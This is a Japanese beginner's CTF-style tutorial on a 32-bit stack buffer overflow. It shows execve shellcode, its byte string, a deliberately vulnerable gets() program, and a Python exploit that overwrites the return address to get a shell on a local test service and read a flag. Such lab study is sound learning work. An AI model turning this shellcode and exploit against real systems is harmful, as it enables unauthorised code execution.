# PWNオーバーフロー入門: 関数の戻り番地を書き換えてシェルコードを実行(SSP、ASLR、PIE、NX無効で32bit ELF)

## 概要

[Linux x86用のシェルコードを書いてみる](http://inaz2.hatenablog.com/entry/2014/03/13/013056) がとても分かりやすくほとんど個々の通りに実行した。

## execveを使ったサンプルコード

```c
saru@lucifen:~/pwn003$ gcc -static test_execve.c
test_execve.c: In function ‘main’:
test_execve.c:6:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
     execve(argv[0], argv, NULL);
     ^~~~~~
saru@lucifen:~/pwn003$ ls
a.out  README.md  test_execve.c
saru@lucifen:~/pwn003$ ./a.out
$ exit
saru@lucifen:~/pwn003$
```

```bash-statement
saru@lucifen:~/pwn003$ gcc -static -m32 -no-pie -fno-stack-protector test_execve.c
test_execve.c: In function ‘main’:
test_execve.c:6:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
     execve(argv[0], argv, NULL);
     ^~~~~~
saru@lucifen:~/pwn003$ ./a.out
$ exit
saru@lucifen:~/pwn003$
```

## アセンブラだけでシェルを呼び出す

```
        .intel_syntax noprefix
        .globl _start
_start:
        push 0x0068732f
        push 0x6e69622f
        mov ebx, esp
        xor edx, edx
        push edx
        push ebx
        mov ecx, esp
        mov eax, 11
        int 0x80
```

-nostdlib (標準ライブラリをリンクしない)と-m32 (32bitでコンパイル)を付けてコンパイル。

```bash-statement
saru@lucifen:~/pwn003$ gcc -nostdlib -m32 test_execve.s
saru@lucifen:~/pwn003$ ./a.out
$ exit
saru@lucifen:~/pwn003$
```

実行して成功した後に気付いたのだがNXは無効になっている？
gdb-pedaで動作を追ってみると面白い。
なるほど．．．

```
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xffffd598 ("/bin/sh")
ECX: 0xffffd590 --> 0xffffd598 ("/bin/sh")
EDX: 0x0
ESI: 0xffffd5ac --> 0xffffd6fe ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
EDI: 0x56555175 (<_start>:      push   0x68732f)
EBP: 0x0
ESP: 0xffffd590 --> 0xffffd598 ("/bin/sh")
EIP: 0x5655518c (<_start+23>:   int    0x80)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555184 <_start+15>:      push   ebx
   0x56555185 <_start+16>:      mov    ecx,esp
   0x56555187 <_start+18>:      mov    eax,0xb
=> 0x5655518c <_start+23>:      int    0x80
   0x5655518e:  add    BYTE PTR [eax],al
   0x56555190:  add    BYTE PTR [eax],al
   0x56555192:  add    BYTE PTR [eax],al
   0x56555194:  add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xffffd590 --> 0xffffd598 ("/bin/sh")
0004| 0xffffd594 --> 0x0
0008| 0xffffd598 ("/bin/sh")
0012| 0xffffd59c --> 0x68732f ('/sh')
0016| 0xffffd5a0 --> 0x1
0020| 0xffffd5a4 --> 0xffffd6e6 ("/home/saru/pwn003/a.out")
0024| 0xffffd5a8 --> 0x0
0028| 0xffffd5ac --> 0xffffd6fe ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x5655518c in _start ()
```

objdumpでみるとこうなっている。

```bash-statement
saru@lucifen:~/pwn003$ objdump -M intel -d a.out

a.out:     file format elf32-i386


Disassembly of section .text:

00000175 <_start>:
 175:   68 2f 73 68 00          push   0x68732f
 17a:   68 2f 62 69 6e          push   0x6e69622f
 17f:   89 e3                   mov    ebx,esp
 181:   31 d2                   xor    edx,edx
 183:   52                      push   edx
 184:   53                      push   ebx
 185:   89 e1                   mov    ecx,esp
 187:   b8 0b 00 00 00          mov    eax,0xb
 18c:   cd 80                   int    0x80
saru@lucifen:~/pwn003$
```




```
a.out:     file format elf32-i386
a.out
architecture: i386, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x00000175

Program Header:
    PHDR off    0x00000034 vaddr 0x00000034 paddr 0x00000034 align 2**2
         filesz 0x000000e0 memsz 0x000000e0 flags r--
  INTERP off    0x00000114 vaddr 0x00000114 paddr 0x00000114 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**12
         filesz 0x00000190 memsz 0x00000190 flags r-x
    LOAD off    0x00000f90 vaddr 0x00001f90 paddr 0x00001f90 align 2**12
         filesz 0x00000070 memsz 0x00000070 flags rw-
 DYNAMIC off    0x00000f90 vaddr 0x00001f90 paddr 0x00001f90 align 2**2
         filesz 0x00000070 memsz 0x00000070 flags rw-
    NOTE off    0x00000128 vaddr 0x00000128 paddr 0x00000128 align 2**2
         filesz 0x00000024 memsz 0x00000024 flags r--
   RELRO off    0x00000f90 vaddr 0x00001f90 paddr 0x00001f90 align 2**0
         filesz 0x00000070 memsz 0x00000070 flags r--
```

そもそもCで書いたものと構造が違うみたい。
↓がCで書いたコードのProgram Header

```
a.out:     file format elf32-i386
a.out
architecture: i386, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x00000440

Program Header:
    PHDR off    0x00000034 vaddr 0x00000034 paddr 0x00000034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r--
  INTERP off    0x00000154 vaddr 0x00000154 paddr 0x00000154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**12
         filesz 0x000007f4 memsz 0x000007f4 flags r-x
    LOAD off    0x00000ed4 vaddr 0x00001ed4 paddr 0x00001ed4 align 2**12
         filesz 0x00000134 memsz 0x00000138 flags rw-
 DYNAMIC off    0x00000edc vaddr 0x00001edc paddr 0x00001edc align 2**2
         filesz 0x000000f8 memsz 0x000000f8 flags rw-
    NOTE off    0x00000168 vaddr 0x00000168 paddr 0x00000168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x00000698 vaddr 0x00000698 paddr 0x00000698 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
         filesz 0x00000000 memsz 0x00000000 flags rw-
   RELRO off    0x00000ed4 vaddr 0x00001ed4 paddr 0x00001ed4 align 2**0
         filesz 0x0000012c memsz 0x0000012c flags r--
```

自分でちゃんと理解しながらやりたかったのだが少しめんどくさかったので参考サイトにのってたのをそのままコピペ

```bash statement
saru@lucifen:~/pwn003$ objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80
saru@lucifen:~/pwn003$
```

つまりシェルコードは

```
\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80
```

## C言語からシェルコードを実行。

関数ポインタを使って実行する。

```c
#include <stdio.h>

char shellcode[] = "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";

int main()
{
  void (*pfunc)();

  pfunc = (void (*)()) shellcode;
  (*pfunc)();
}
```

コンパイルして実行するとSegmentation faultで落ちる。
```
saru@lucifen:~/pwn003$ gcc -m32 shellcode.c
saru@lucifen:~/pwn003$ ./a.out
Segmentation fault (core dumped)
saru@lucifen:~/pwn003$
```

理由はNXが有効になってるから。

```
saru@lucifen:~/pwn003$ objdump -x a.out

a.out:     file format elf32-i386
a.out
architecture: i386, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x000003b0

Program Header:
    PHDR off    0x00000034 vaddr 0x00000034 paddr 0x00000034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r--
  INTERP off    0x00000154 vaddr 0x00000154 paddr 0x00000154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**12
         filesz 0x000006e0 memsz 0x000006e0 flags r-x
    LOAD off    0x00000edc vaddr 0x00001edc paddr 0x00001edc align 2**12
         filesz 0x00000146 memsz 0x00000148 flags rw-
 DYNAMIC off    0x00000ee4 vaddr 0x00001ee4 paddr 0x00001ee4 align 2**2
         filesz 0x000000f8 memsz 0x000000f8 flags rw-
    NOTE off    0x00000168 vaddr 0x00000168 paddr 0x00000168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x000005b0 vaddr 0x000005b0 paddr 0x000005b0 align 2**2
         filesz 0x0000003c memsz 0x0000003c flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
         filesz 0x00000000 memsz 0x00000000 flags rw-
   RELRO off    0x00000edc vaddr 0x00001edc paddr 0x00001edc align 2**0
         filesz 0x00000124 memsz 0x00000124 flags r--
```

checksec

```
saru@lucifen:~/pwn003$ checksec --file a.out
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   a.out

saru@lucifen:~/pwn003$
```

NXを無効にしてコンパイルしなおして実行。
見事にシェルが実行された。

```
saru@lucifen:~/pwn003$ gcc -z execstack -m32 shellcode.c
saru@lucifen:~/pwn003$ ./a.out
$
$ exit
saru@lucifen:~/pwn003$
```

STACKでの実行が許可されている。

```
saru@lucifen:~/pwn003$ objdump -x a.out

a.out:     file format elf32-i386
a.out
architecture: i386, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x000003b0

Program Header:
    PHDR off    0x00000034 vaddr 0x00000034 paddr 0x00000034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r--
  INTERP off    0x00000154 vaddr 0x00000154 paddr 0x00000154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**12
         filesz 0x000006e0 memsz 0x000006e0 flags r-x
    LOAD off    0x00000edc vaddr 0x00001edc paddr 0x00001edc align 2**12
         filesz 0x00000146 memsz 0x00000148 flags rw-
 DYNAMIC off    0x00000ee4 vaddr 0x00001ee4 paddr 0x00001ee4 align 2**2
         filesz 0x000000f8 memsz 0x000000f8 flags rw-
    NOTE off    0x00000168 vaddr 0x00000168 paddr 0x00000168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x000005b0 vaddr 0x000005b0 paddr 0x000005b0 align 2**2
         filesz 0x0000003c memsz 0x0000003c flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
         filesz 0x00000000 memsz 0x00000000 flags rwx
   RELRO off    0x00000edc vaddr 0x00001edc paddr 0x00001edc align 2**0
         filesz 0x00000124 memsz 0x00000124 flags r--
```

checksec

```
saru@lucifen:~/pwn003$ checksec --file a.out
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   a.out

saru@lucifen:~/pwn003$
```


## 脆弱性のあるコード「scanf」版

今回はscafを使ってみた。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void saru()
{
  char buf[128];

  scanf("%s", buf);
  puts(buf);
}

int main(){
  saru();

  return 0;
}
```

objdumpで調べる

- 0x08484bc: main()
- 0x0848476: saru()
- saru用に132バイトstack領域が取られている。

gdbでメモリの場所を調べる

- 0xffffd450: buf
- 0xffffd4dc: return address
- bufから140バイトでreturn addressに到達する

ところがいろいろやってみてもどうもうまくスタックに書き込めて無い様子。

[ytoku/CTF/Writeup/AdventCalendarCTF2014/2014-12-17 - 電気通信大学MMA](https://wiki.mma.club.uec.ac.jp/ytoku/CTF/Writeup/AdventCalendarCTF2014/2014-12-17)

> さらに，使用しているのがscanfであるためisspaceで空白とみなされる文字は使用できない。 09 0a 0b 0c 0d 20 (1cも？)を使用せずに入力を作成しなければならない。

ということでscanfを使うと駄目みたい．．．

## 脆弱性のあるコード「gets」版

scanfを使う場合Return Oriented Programming (ROP)を書けばできるらしい。
が、ROPはまたさらに上級なテクニックということで今回はシェルコードを素直に送り付けたやつをやりたかったのでgetsを使って↑のシェルコードで実行するのを試みた。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void saru()
{
  char buf[128];

  gets(buf);
  puts(buf);
}

int main(){
  saru();

  return 0;
}
```

gdbで調べると以下の2つが分かる

- 0xffffd4dc: return address
- 0xffffd450: buf

140バイトゴミを書いたら141～144バイトでreturn addressを書き換えることができる。

ローカルでの動作確認はsegmentation faultやillegal instructionが出てなければ動いている場合がある。
ここではまったのだけど標準入力と標準出力がうまくつながってないとシェルが会話できなくて終了する。

stackの詰まれ方がgdbで動かした場合と異なるのでNOP sledingで無理やりあたりを付ける。
今回の場合にはgdbで動かしたときが0xffffd450だったのが生実行だと0xffffd490に変わった。
つまり64バイト分スタック使用量が少なくなっている。

## リモートからシェルを取る

というわけでexploit code。

```python
import socket
import time
import telnetlib



def main():
    buf = b"\x90" * 80;
    buf += b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
    buf += b'A' * (140 - 25 - 80)
    buf += b'\xb0\xd4\xff\xff'

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("localhost", 28080))
    time.sleep(1)
    print(buf)
    sock.sendall(buf)

    print("interact mode")
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()



if __name__ == "__main__":
    main()
```
実行結果。

```bash-statement
saru@lucifen:~/pwn003$ python exploit03.py
b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90h/sh\x00h/bin\x89\xe31\xd2RS\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0\xd4\xff\xff'
interact mode

cat flag.txt
flag is HANDAI_CTF

exit
*** Connection closed by remote host ***
saru@lucifen:~/pwn003$
```



## 参考サイト


- [シェルコード書いてみた](https://qiita.com/slowsingle/items/59c139b747edec9157cc)
- [Linux x86用のシェルコードを書いてみる](http://inaz2.hatenablog.com/entry/2014/03/13/013056)
- [Buffer Overflow Exploit - Dhaval Kapil](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)
- [Shellcode Injection - Dhaval Kapil](https://dhavalkapil.com/blogs/Shellcode-Injection/)
